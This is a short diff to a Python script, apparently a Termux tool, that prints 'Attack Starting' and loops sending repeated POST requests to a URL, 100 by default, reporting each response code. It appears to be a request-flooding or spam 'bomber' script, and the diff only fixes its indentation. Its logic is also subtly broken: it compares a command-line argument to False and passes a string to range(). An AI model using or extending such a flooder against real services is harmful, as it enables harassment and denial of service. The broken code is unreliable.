@@ -29,11 +29,10 @@ https://termuxid.dev
 
 if sys.argv[2] == False:
     amount = 100
-    else:
-        amount = sys.argv[2]
-
+else:
+    amount = sys.argv[2]
 os.system("clear")
 os.system("figlet Attack Starting")
-  for i in range(1,amount):
+for i in range(1,amount):
   r = requests.post(url,data=data,headers=h)
   print("Send {}, respon {}".format(i,r.status_code))
